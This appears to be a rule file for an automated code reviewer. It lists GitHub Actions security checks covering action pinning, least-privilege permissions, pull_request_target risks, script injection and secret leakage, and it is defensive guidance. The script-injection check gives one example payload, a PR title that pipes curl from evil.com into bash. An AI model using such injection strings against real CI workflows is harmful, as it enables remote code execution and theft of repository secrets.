---
id: cicd-github-actions
type: primary
depth_role: leaf
focus: Detect GitHub Actions security and reliability issues including unpinned actions, secrets exposure, excessive permissions, pull_request_target dangers, and missing concurrency controls
parents:
  - index.md
covers:
  - Actions referenced by mutable tag instead of full SHA pin
  - Secrets leaked in workflow logs via echo, debug, or set-output
  - Workflow with default write-all permissions instead of least privilege
  - "pull_request_target trigger with explicit checkout of PR head (code injection)"
  - Missing concurrency group causing redundant parallel runs
  - Self-hosted runner without job-level isolation or ephemeral configuration
  - "Secrets cached in actions/cache or artifact uploads"
  - workflow_dispatch inputs used in shell commands without validation
  - Third-party action from unverified publisher performing privileged operations
  - Missing timeout-minutes on long-running jobs
tags:
  - github-actions
  - ci-cd
  - workflow
  - supply-chain
  - secrets
  - permissions
  - CWE-829
  - CWE-798
activation:
  file_globs:
    - "**/.github/workflows/*.yml"
    - "**/.github/workflows/*.yaml"
    - "**/.github/actions/**"
  keyword_matches:
    - "uses:"
    - "runs-on:"
    - "permissions:"
    - pull_request_target
    - workflow_dispatch
    - concurrency
    - GITHUB_TOKEN
    - secrets.
    - "actions/checkout"
    - "actions/cache"
  structural_signals:
    - GitHub Actions workflow file change
    - New or modified action reference
    - Permissions block added or removed
source:
  origin: file
  path: cicd-github-actions.md
  hash: "sha256:c95ba1fce24d7e0a3119cced89b630ca7a44acb8745c41e42f246e2577866c21"
---
# GitHub Actions Security and Reliability

## When This Activates

Activates when diffs touch `.github/workflows/` YAML files or custom action definitions. GitHub Actions workflows execute with access to repository secrets, cloud credentials, and write permissions to the repository itself. A single misconfigured workflow can leak secrets to pull request authors, allow code injection via crafted PR titles, or let a compromised third-party action exfiltrate credentials. This reviewer detects the highest-impact GitHub Actions pitfalls that lead to supply chain compromise, secret leakage, and CI resource abuse.

## Audit Surface

- [ ] Action referenced by mutable tag instead of full 40-char SHA
- [ ] Workflow or job missing explicit permissions block (defaults to write-all)
- [ ] pull_request_target with checkout of PR head ref
- [ ] Secret interpolated in run: step that could leak to logs
- [ ] Missing concurrency group on push or PR-triggered workflow
- [ ] Self-hosted runner without ephemeral or container isolation
- [ ] Cache key or artifact containing secret-derived values
- [ ] workflow_dispatch input used in shell without sanitization
- [ ] User-controlled input (${{ github.event.*.body }}) in run: step
- [ ] Job without timeout-minutes
- [ ] GITHUB_TOKEN with write permissions beyond what the job needs
- [ ] Reusable workflow or composite action called without SHA pin
- [ ] Deployment job without environment protection rules
- [ ] Upload-artifact step including sensitive file paths

## Detailed Checks

### Unpinned Actions and Supply Chain
<!-- activation: keywords=["uses:", "actions/", "@v", "@main", "@master", "sha"] -->

- [ ] **Mutable tag reference**: flag `uses: owner/action@v4` or `uses: owner/action@main` -- tags and branches are mutable; a compromised action repository can push malicious code to an existing tag. Pin to the full 40-character SHA and add a version comment: `uses: actions/checkout@abc123 # v4.1.1`
- [ ] **Unverified third-party action**: flag actions from non-GitHub-verified publishers that access secrets, deploy, or push to registries. Prefer actions from `actions/`, verified publishers, or fork-and-pin the action into your own organization
- [ ] **Reusable workflow unpinned**: flag `uses: org/repo/.github/workflows/ci.yml@main` -- reusable workflows inherit the caller's secrets and GITHUB_TOKEN; pin to SHA just like actions
- [ ] **Composite action without pinned internal steps**: flag custom composite actions in `.github/actions/` that themselves reference third-party actions by mutable tag -- the pinning chain must be complete

### Permissions and Least Privilege
<!-- activation: keywords=["permissions:", "GITHUB_TOKEN", "contents:", "packages:", "id-token:", "write", "read"] -->

- [ ] **Missing permissions block**: flag workflows without a top-level `permissions:` key -- the default is `write-all` for non-fork repositories, granting every job full write access to contents, packages, issues, and deployments. Set `permissions: {}` at the workflow level and grant only what each job needs
- [ ] **Overly broad job permissions**: flag jobs with `contents: write` when they only read code, or `packages: write` when they do not publish. Each permission should be justified by the job's actual operations
- [ ] **id-token: write without OIDC use**: flag `id-token: write` on jobs that do not perform OIDC federation to cloud providers -- this permission allows the job to mint tokens exchangeable for cloud credentials

### pull_request_target and Script Injection
<!-- activation: keywords=["pull_request_target", "github.event.", "github.head_ref", "github.event.pull_request", "github.event.issue.title", "github.event.comment.body"] -->

- [ ] **pull_request_target with PR checkout**: flag workflows using `pull_request_target` that check out the PR head (`ref: ${{ github.event.pull_request.head.sha }}`) -- this executes untrusted PR code with access to repository secrets. Use `pull_request` trigger instead, or isolate the untrusted checkout into a separate unprivileged job
- [ ] **Script injection via context expressions**: flag `run:` steps that interpolate user-controlled context values (`${{ github.event.issue.title }}`, `${{ github.event.pull_request.body }}`, `${{ github.head_ref }}`) directly in shell commands -- an attacker crafts a PR title like `"; curl evil.com | bash; echo "` to inject arbitrary commands. Use an environment variable intermediary: `env: TITLE: ${{ github.event.issue.title }}` then reference `$TITLE` in the shell

### Secrets Leakage and Caching
<!-- activation: keywords=["secrets.", "echo", "set-output", "::add-mask::", "actions/cache", "actions/upload-artifact", "ACTIONS_STEP_DEBUG"] -->

- [ ] **Secret in log output**: flag `echo "${{ secrets.MY_SECRET }}"` or `run:` steps that concatenate, decode, or derive values from secrets without masking -- derived values are not auto-masked. Use `::add-mask::` for any value derived from a secret
- [ ] **Secret in cache key**: flag `actions/cache` with a key that includes secret-derived values -- cache entries are accessible to all branches and could be read by a malicious PR workflow
- [ ] **Secret in artifact**: flag `actions/upload-artifact` steps that include paths likely to contain credentials (.env, config with secrets, key files) -- artifacts are downloadable by anyone with repository read access
- [ ] **ACTIONS_STEP_DEBUG left enabled**: flag workflows or repository settings enabling step debug logging in production -- debug mode prints all secret masking operations and may reveal redacted values

### Concurrency, Timeouts, and Self-Hosted Runners
<!-- activation: keywords=["concurrency:", "timeout-minutes:", "runs-on:", "self-hosted", "cancel-in-progress"] -->

- [ ] **Missing concurrency group**: flag push- or PR-triggered workflows without a `concurrency:` block -- parallel runs for the same branch waste compute and can cause deployment races. Use `concurrency: { group: ${{ github.workflow }}-${{ github.ref }}, cancel-in-progress: true }` for PR workflows
- [ ] **Missing timeout**: flag jobs without `timeout-minutes` -- the default is 360 minutes (6 hours), which allows stuck jobs to consume runner capacity indefinitely
- [ ] **Self-hosted runner without isolation**: flag `runs-on: self-hosted` or custom labels without evidence of ephemeral runners or container-based isolation -- persistent self-hosted runners retain files, credentials, and processes between jobs, allowing one job to tamper with subsequent jobs

## Common False Positives

- **First-party actions** (`uses: ./.github/actions/my-action`) reference code in the same repository at the same commit and are inherently pinned. Do not flag these for SHA pinning.
- **Permissions at workflow level already restrictive**: if `permissions: read-all` or `permissions: {}` is set at the workflow level, individual jobs inherit the restriction. Only flag jobs that explicitly escalate beyond the workflow default.
- **pull_request_target without checkout**: workflows that use `pull_request_target` only to label or comment (without checking out PR code) are safe. Only flag when combined with `actions/checkout` of the PR ref.
- **Concurrency not needed on scheduled workflows**: cron-triggered workflows typically need to run every invocation. Missing concurrency is not a finding for `schedule:` triggers.

## Severity Guidance

| Finding | Severity |
|---|---|
| pull_request_target with checkout of untrusted PR code accessing secrets | Critical |
| Script injection via user-controlled context in run: step | Critical |
| Action pinned to mutable tag that accesses secrets or deploys | Critical |
| Missing permissions block (defaults to write-all) | Important |
| Secret leaked in workflow log output (echo, debug, derived value) | Important |
| Self-hosted runner without ephemeral or container isolation | Important |
| Secret included in cache key or uploaded artifact | Important |
| workflow_dispatch input used unsanitized in shell command | Important |
| Missing concurrency group causing redundant parallel runs | Minor |
| Missing timeout-minutes on job | Minor |
| GITHUB_TOKEN with unnecessary write scope | Minor |

## See Also

- `sec-supply-chain-sbom-slsa-sigstore` -- action pinning is a supply chain integrity control
- `sec-secrets-management-and-rotation` -- secrets in CI/CD pipelines and log leakage
- `cicd-pipeline-secrets-discipline` -- cross-platform CI secrets hygiene
- `cicd-merge-queue-and-branch-protection` -- required status checks and branch protection rules
- `cicd-caching-strategy` -- cache poisoning and invalidation across CI platforms

## Authoritative References

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-for-github-actions)
- [GitHub Actions Permissions Documentation](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/controlling-permissions-for-github_token)
- [OWASP CI/CD Security Top 10](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
- [StepSecurity: GitHub Actions Security Best Practices](https://www.stepsecurity.io/)
- [CWE-829: Inclusion of Functionality from Untrusted Control Sphere](https://cwe.mitre.org/data/definitions/829.html)
